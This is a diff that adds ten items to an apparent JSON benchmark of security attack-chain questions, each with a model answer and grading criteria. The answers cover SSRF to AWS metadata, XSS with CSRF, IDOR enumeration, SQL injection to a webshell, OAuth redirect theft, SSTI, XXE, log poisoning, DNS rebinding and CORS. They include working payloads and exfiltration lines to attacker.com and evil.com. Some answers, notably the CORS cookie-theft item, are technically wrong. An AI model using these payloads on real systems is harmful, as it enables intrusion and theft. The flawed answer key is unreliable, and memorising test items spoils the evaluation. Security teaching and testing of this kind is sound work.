@@ -4871,5 +4871,115 @@
     "impact_level": "Critical \u2013 Remote code execution on internal Jenkins via XXE-enabled SSRF",
     "category": "chain_scenarios",
     "evaluation_criteria": "Must explain XXE in Excel XML and how file parsing triggers entity resolution; Must identify Jenkins network accessibility and default credential weakness; Must connect SSRF to Jenkins Script Console exploitation and Groovy RCE."
+  },
+  {
+    "id": 444,
+    "scenario": "Application accepts webhook URLs from admin panel; SSRF via internal metadata endpoint accessible.",
+    "chain_steps": "SSRF to metadata service \u2192 Extract AWS credentials \u2192 Call STS assume-role \u2192 Execute Lambda function with RCE payload",
+    "prompt": "Explain how SSRF through webhook configuration leads to remote code execution via AWS metadata.",
+    "expected_answer": "The attacker identifies a webhook URL parameter in the admin settings that fetches and processes the endpoint without validating IP ranges. By pointing the webhook to http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role, the attacker retrieves temporary AWS credentials. The application's IAM role lacks proper scoping, allowing credential usage. The attacker then calls STS to assume a higher-privilege role or directly invokes a Lambda function with execution permissions. Using the aws-cli or SDK with stolen credentials, the attacker invokes a Lambda function passing a shell script as the payload, gaining code execution within the AWS environment. The critical gap is: (1) No IP allowlist restricting metadata endpoints, (2) Over-permissioned IAM role, (3) No validation of webhook response content. The chain succeeds because each step amplifies privilege without sufficient boundary controls.",
+    "reasoning_requirement": "Recognize SSRF to credential theft and IAM overpermission as RCE vector.",
+    "impact_level": "Critical \u2013 Remote Code Execution via AWS Lambda",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify metadata endpoint as the SSRF target, explain credential extraction mechanism, and demonstrate how the stolen credentials enable Lambda invocation with arbitrary payload."
+  },
+  {
+    "id": 445,
+    "scenario": "Search parameter reflects user input without sanitization; password change endpoint does not validate CSRF tokens.",
+    "chain_steps": "Craft XSS payload in search query \u2192 Victim visits malicious link \u2192 JavaScript fires password change request \u2192 CSRF succeeds (no token validation) \u2192 Account takeover",
+    "prompt": "Explain how XSS combined with CSRF token bypass compromises user accounts.",
+    "expected_answer": "The application reflects search input in the response HTML without encoding, enabling XSS via payloads like `?search=<img src=x onerror='fetch(\"/api/user/password\", {method:\"POST\", body:JSON.stringify({newPassword:\"attacker123\"})})'>`. An admin or high-privilege user visits a phishing link containing this payload. The victim's browser executes the injected script within the application's origin, gaining access to session cookies and CSRF tokens (if present). However, the password change endpoint fails to validate or verify the CSRF token, accepting requests solely based on session validity. The attacker's JavaScript can then forge a POST request to change the password, which succeeds because: (1) The browser automatically includes the session cookie, (2) No CSRF token is verified on the endpoint, (3) The script executes with the victim's privileges. Post-attack, the attacker logs in with the new password, gaining full account access. The chain succeeds because XSS bypasses the same-origin policy boundary, and missing CSRF validation on sensitive endpoints eliminates the secondary defense.",
+    "reasoning_requirement": "Recognize XSS-to-CSRF escalation when CSRF tokens are absent or improperly validated.",
+    "impact_level": "Critical \u2013 Full Account Takeover",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the XSS payload injection point, demonstrate how JavaScript executes with user privileges, and identify the CSRF token validation failure on the password endpoint."
+  },
+  {
+    "id": 446,
+    "scenario": "User API endpoint returns full profiles using sequential numeric IDs without authorization checks.",
+    "chain_steps": "Enumerate user ID range via timing attack \u2192 Fetch all user records via IDOR \u2192 Export PII dataset (emails, names, phone numbers, addresses)",
+    "prompt": "Explain IDOR exploitation leading to large-scale PII exposure.",
+    "expected_answer": "The application exposes `/api/users/{userId}` returning full user profiles (email, name, phone, address, payment info) based solely on the numeric user ID in the URL. An attacker identifies the endpoint and tests authorization by requesting `/api/users/1`, `/api/users/2`, etc. The API returns valid data for all IDs without checking if the requester owns or has permission to access that profile. No role-based access control (RBAC) is enforced on the endpoint. The attacker writes a script to enumerate user IDs from 1 to 999999, making parallel requests to maximize throughput. Each request succeeds, returning complete PII. Within hours, the attacker collects hundreds of thousands of user records. The resulting dataset can be sold on dark markets, used for targeted phishing, or leveraged for identity theft. The vulnerability succeeds because: (1) Sequential IDs are trivially enumerable, (2) No per-user authorization check exists, (3) Responses contain sensitive data, (4) No rate limiting or anomaly detection. This represents a complete failure of the access control boundary\u2014the application trusts URL parameters to enforce authorization instead of verifying the authenticated user's relationship to the requested resource.",
+    "reasoning_requirement": "Recognize IDOR as a direct authorization bypass enabling dataset-scale exploitation.",
+    "impact_level": "Critical \u2013 Large-scale PII Breach",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the enumerable ID scheme, explain the missing authorization check, and quantify the scale and sensitivity of exposed data."
+  },
+  {
+    "id": 447,
+    "scenario": "Product search parameter vulnerable to SQL injection; database runs as user with FILE privileges.",
+    "chain_steps": "Test SQL injection via union-based technique \u2192 Confirm FILE privilege availability \u2192 Write shell.php to web root using INTO OUTFILE \u2192 Execute uploaded shell",
+    "prompt": "Explain SQLi exploitation leading to file write and RCE.",
+    "expected_answer": "The search endpoint constructs SQL queries by concatenating user input: `SELECT * FROM products WHERE name LIKE '%{search}%'`. An attacker injects SQL metacharacters to break out: `' UNION SELECT 1,2,3,version()--`. The query executes, revealing the database version and confirming SQLi. The attacker then probes for FILE privileges by injecting `' UNION SELECT LOAD_FILE('/etc/passwd')--`, successfully reading the system password file. This confirms the database user (typically the application's DB account) has FILE read/write permissions\u2014a critical misconfiguration. The attacker constructs a payload to write a PHP webshell: `'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';--`. The query executes, writing the shell to the web root. The attacker then accesses `http://target.com/shell.php?cmd=id`, executing arbitrary commands with the web server's privileges. From the shell, the attacker establishes reverse access, escalates privileges, and gains full system compromise. The chain succeeds because: (1) Unsanitized SQL input, (2) Over-privileged database user, (3) Web root writable by database user, (4) No output encoding on web responses. Each step cascades from insufficient input validation and excessive privilege.",
+    "reasoning_requirement": "Recognize SQLi-to-file-write as RCE vector when database has filesystem privileges.",
+    "impact_level": "Critical \u2013 Remote Code Execution via File Write",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must demonstrate the SQL injection technique, identify the FILE privilege misconfiguration, and explain the webshell deployment and execution mechanism."
+  },
+  {
+    "id": 448,
+    "scenario": "OAuth callback URL parameter accepts arbitrary domains; state parameter not validated in token exchange.",
+    "chain_steps": "Craft open redirect to attacker domain \u2192 Victim clicks consent link \u2192 Authorization code sent to attacker \u2192 Exchange code for access token \u2192 Impersonate user",
+    "prompt": "Explain open redirect combined with OAuth state validation bypass leading to token theft.",
+    "expected_answer": "The OAuth implementation uses a callback URL parameter: `?callback=https://redirect.evil.com/steal`. An attacker crafts a phishing link to the authorization endpoint with this callback URL. When a victim clicks the link and grants consent, the OAuth provider redirects to the attacker's domain with the authorization code appended: `https://redirect.evil.com/steal?code=AUTH_CODE_XYZ`. The attacker captures the code and exchanges it for an access token without impedance. The vulnerability exists because: (1) The callback URL is not validated against a whitelist, (2) The application doesn't verify the state parameter to bind the authorization request to the user session, (3) The code exchange succeeds with only the code (no PKCE challenge verification). With the access token, the attacker can impersonate the victim, accessing their email, contacts, documents, or initiating transactions depending on the granted scopes. This represents a complete OAuth compromise: authorization code interception + state validation bypass eliminates the ability to detect or prevent token theft. The attacker gains full account access without knowing the victim's password, as OAuth assumes the authorization server is trusted and tokens are managed securely.",
+    "reasoning_requirement": "Recognize open redirect as OAuth credential theft vector when state validation is absent.",
+    "impact_level": "Critical \u2013 OAuth Token Compromise & Account Takeover",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the callback URL validation failure, explain the state parameter absence, and demonstrate the code exchange to token conversion mechanism."
+  },
+  {
+    "id": 449,
+    "scenario": "File upload endpoint accepts .html, .jinja2, .twig files; template engine renders uploaded files with access to app context.",
+    "chain_steps": "Upload malicious template with template injection payload \u2192 Access template context variables (config, secrets) \u2192 Execute code via template expression \u2192 RCE",
+    "prompt": "Explain file upload exploitation through server-side template injection.",
+    "expected_answer": "The file upload endpoint accepts multiple file types without restriction, including template files. An attacker uploads a .jinja2 file containing a Server-Side Template Injection (SSTI) payload: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`. When the application renders this template to generate a preview or email confirmation, Jinja2 evaluates the expression. The template engine executes Python code within the application's process context, gaining access to imported modules and configuration variables. The attacker escalates from template expressions to direct code execution by leveraging Python's introspection: accessing __class__, __init__, __globals__, and importing os.popen(). The vulnerability succeeds because: (1) No file type validation exists, (2) Uploaded files are rendered/evaluated, (3) Template engine runs with application privileges, (4) No sandboxing of template execution. The attacker can read environment variables (AWS keys, database credentials), execute system commands (reverse shell), or modify application data. The file upload boundary (where user files enter the system) directly connects to code execution due to the template rendering step. Preventing this requires: (1) Whitelisting safe file types, (2) Serving uploaded files as static assets (not rendering them), (3) Using a sandboxed template engine, (4) Implementing file integrity checks.",
+    "reasoning_requirement": "Recognize file upload + template rendering as direct RCE vector.",
+    "impact_level": "Critical \u2013 Remote Code Execution via SSTI",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the exploitable template engine, explain the SSTI payload construction, and demonstrate how introspection leads to code execution."
+  },
+  {
+    "id": 450,
+    "scenario": "XML parsing endpoint processes user-supplied XML; XXE allows external entity definition; application can make HTTP requests to internal network.",
+    "chain_steps": "XXE payload with external entity pointing to metadata service \u2192 SSRF request to AWS metadata \u2192 Extract temporary credentials \u2192 Use credentials for privilege escalation",
+    "prompt": "Explain XXE exploitation leading to SSRF and AWS credential theft.",
+    "expected_answer": "The application accepts XML input for document processing or configuration: `POST /api/documents/parse`. An attacker submits an XXE payload: `<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/instance-profile\">]><document>&xxe;</document>`. The XML parser expands the external entity, making an HTTP request to the AWS metadata service. The response (containing temporary AWS credentials) is included in the parsing output or error message. The attacker extracts the credentials and uses them with AWS CLI or SDK to list S3 buckets, read objects, invoke Lambda functions, or escalate to higher-privilege roles. The vulnerability chain succeeds because: (1) XXE processing is enabled by default in many XML parsers, (2) No validation blocks entity expansion, (3) The application can reach internal networks (metadata service), (4) Responses leak sensitive data. This represents a dual boundary failure: XXE bypasses the file system boundary (accessing internal metadata), and SSRF bypasses the network boundary (reaching services assumed to be unreachable). Modern defenses include disabling DOCTYPE declarations, using whitelisted entity definitions, and restricting DNS resolution to prevent SSRF. The leaked credentials typically grant permissions sufficient for further infrastructure compromise, making this chain a gateway to cloud account takeover.",
+    "reasoning_requirement": "Recognize XXE as SSRF vector enabling cloud credential extraction.",
+    "impact_level": "Critical \u2013 AWS Credentials & Infrastructure Compromise",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the XXE payload structure, identify the metadata endpoint as SSRF target, and demonstrate credential usage for privilege escalation."
+  },
+  {
+    "id": 451,
+    "scenario": "Local file inclusion in log viewer; application logs HTTP headers; logs stored in web-accessible directory.",
+    "chain_steps": "Inject PHP code via User-Agent header \u2192 Header logged to file \u2192 LFI to access log file \u2192 PHP interpreter executes injected code",
+    "prompt": "Explain log poisoning escalation from LFI to RCE.",
+    "expected_answer": "The application includes a log viewer endpoint accessible via `/admin/logs?file=access.log`, vulnerable to LFI. An attacker crafts a request with a malicious User-Agent header containing PHP code: `User-Agent: <?php system($_GET['cmd']); ?>`. The application logs the request, including the header value, to a log file stored in `/var/log/app/access.log` or similar (often in a web-accessible directory due to misconfiguration). The attacker then uses LFI to access the log file: `/admin/logs?file=../../../var/log/app/access.log`. The application reads and outputs the log file content to the HTTP response. If the web server is configured to parse .log files as PHP (or the attacker targets a .php log file), the injected code executes. The attacker gains RCE by calling the webshell: `http://target.com/admin/logs?file=../../../var/log/app/access.log&cmd=whoami`. This chain succeeds because: (1) Unsanitized file inclusion parameter, (2) No path traversal filtering, (3) User input logged without sanitization, (4) Logs stored in web-accessible directory, (5) Server misconfiguration allows code execution in log files. Defenses include: strict LFI filtering, sanitizing logged data, storing logs outside the web root, and configuring servers to not execute code in log file directories.",
+    "reasoning_requirement": "Recognize log poisoning as LFI-to-RCE vector when logs are in web-accessible paths.",
+    "impact_level": "Critical \u2013 Remote Code Execution via Log Injection",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the log injection vector, explain the LFI traversal, and demonstrate how PHP execution in logs leads to command execution."
+  },
+  {
+    "id": 452,
+    "scenario": "Application fetches URLs from user input with DNS resolution; DNS rebinding attack redirects to localhost after initial check.",
+    "chain_steps": "Attacker controls authoritative DNS for attacker.com \u2192 URL validation fetches attacker.com \u2192 Resolve to internal IP (127.0.0.1) on second request \u2192 Access internal service (Redis, Jenkins, admin panel)",
+    "prompt": "Explain DNS rebinding exploitation as SSRF attack vector.",
+    "expected_answer": "The application includes a feature to fetch content from user-supplied URLs, ostensibly for embedding or previewing: `POST /api/fetch?url=http://attacker.com/payload`. A URL validation step checks if the domain is allowed, performing a DNS lookup to confirm attacker.com resolves. The application naively caches or doesn't cache the DNS result appropriately. An attacker controls the authoritative DNS server for attacker.com and configures it with a short TTL (time-to-live). On the first DNS query during validation, it returns the attacker's legitimate IP. The validation passes. When the application makes the actual HTTP request to fetch content, the DNS cache expires or the resolver re-queries, and the attacker's DNS server now returns 127.0.0.1 (localhost). The HTTP request connects to the local system, potentially accessing: Redis (default port 6379), Jenkins (port 8080), or an internal admin panel (port 8000). The attacker can now run Redis commands, trigger Jenkins builds, or steal session tokens from the admin panel. This succeeds because: (1) URL validation and actual request use separate DNS resolutions, (2) DNS TTL is too short or caching is bypassed, (3) No IP address validation post-resolution, (4) Internal services lack authentication or are poorly protected. Mitigation includes: validating resolved IPs against allowlists, using persistent DNS caching, and disabling access to private IP ranges (127.0.0.0/8, 10.0.0.0/8, etc.).",
+    "reasoning_requirement": "Recognize DNS rebinding as SSRF attack enabling access to internal services.",
+    "impact_level": "High \u2013 Internal Service Compromise via DNS Rebinding",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the DNS rebinding timing window, identify the SSRF target (internal service), and demonstrate how attacker controls the DNS response."
+  },
+  {
+    "id": 453,
+    "scenario": "CORS policy allows requests from any origin (*); session cookies lack HttpOnly flag; JavaScript can read cookies.",
+    "chain_steps": "Attacker creates exploit page with fetch() to target API \u2192 Browser sends credentials (cookies) automatically \u2192 JavaScript reads response & extracts session cookie \u2192 Impersonate victim",
+    "prompt": "Explain CORS misconfiguration enabling session cookie theft.",
+    "expected_answer": "The application sets CORS headers to `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, a dangerous combination that allows any origin to make credentialed requests. Session cookies are stored without the HttpOnly flag, making them readable by JavaScript. An attacker crafts a malicious webpage hosted on attacker.com containing JavaScript: `fetch('http://target.com/api/user/profile', {credentials: 'include'}).then(r => r.json()).then(d => fetch('http://attacker.com/exfil?cookie=' + document.cookie))`. When a victim visits the attacker's page while logged into the target application, the browser automatically includes session cookies in the fetch request (due to credentials: 'include'). The API response is readable by the attacker's JavaScript (due to CORS *). The attacker extracts document.cookie and sends it to their server. With the session cookie, the attacker can forge requests as the victim: creating accounts, transferring funds, changing passwords, or exfiltrating data. The vulnerability chain succeeds because: (1) CORS allows any origin with credentials, (2) Cookies lack HttpOnly protection, (3) No SameSite attribute on cookies, (4) No additional verification (CSRF tokens, challenge-response) on sensitive endpoints. Mitigation: restrict CORS origins to trusted domains, enable HttpOnly and Secure flags on cookies, implement SameSite=Strict, and enforce CSRF tokens on state-changing operations.",
+    "reasoning_requirement": "Recognize CORS misconfiguration combined with cookie exposure as session theft vector.",
+    "impact_level": "Critical \u2013 Session Hijacking & Account Takeover",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the CORS wildcard misconfiguration, explain the HttpOnly flag absence enabling cookie exfiltration, and demonstrate the session theft mechanism."
   }
 ]
